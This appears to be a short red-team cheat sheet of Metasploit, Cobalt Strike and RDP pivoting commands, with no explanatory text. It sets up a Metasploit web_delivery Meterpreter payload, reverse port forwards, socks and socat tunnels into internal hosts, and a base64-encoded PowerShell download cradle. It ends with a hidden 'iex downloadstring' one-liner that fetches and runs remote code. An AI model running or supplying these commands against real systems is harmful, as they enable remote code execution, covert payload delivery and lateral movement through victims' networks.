
### Metasploit
```
portfwd add -R -p 8080 -L 192.168.100.166 -l 443
msf5 > use exploit/multi/script/web_delivery
msf5 exploit(multi/script/web_delivery) > set target 2
msf5 exploit(multi/script/web_delivery) > set SRVHOST 192.168.100.166
msf5 exploit(multi/script/web_delivery) > set SRVPORT 443
msf5 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/bind_tcp
msf5 exploit(multi/script/web_delivery) > set EXITFUNC thread
msf5 exploit(multi/script/web_delivery) > set URIPATH /msf.ps1
msf5 exploit(multi/script/web_delivery) > exploit -j
``

### CS
```
socks 1080

rportfwd 8080 192.168.100.166 443

proxychains socat TCP4-Listen:1433,fork TCP:10.10.120.20:1433

PS C:\Users\Commando> $OriginalCommand = "iex (New-Object Net.WebClient).DownloadString('http://wkstn-1555:8080/a')"
PS C:\Users\Commando> [System.Convert]::ToBase64String([System.Text.Encoding]::unicode.GetBytes($OriginalCommand))

```

###RDP
```
socks 1337

proxychains socat TCP4-LISTEN:3389,fork TCP4:10.0.0.100:3389

rportfwd 8080 178.62.56.134 80

powershell.exe -nop -w hidden -c "iex ((new-object net.webclient).downloadstring('http://10.0.1.200:8080/smb'))"


```

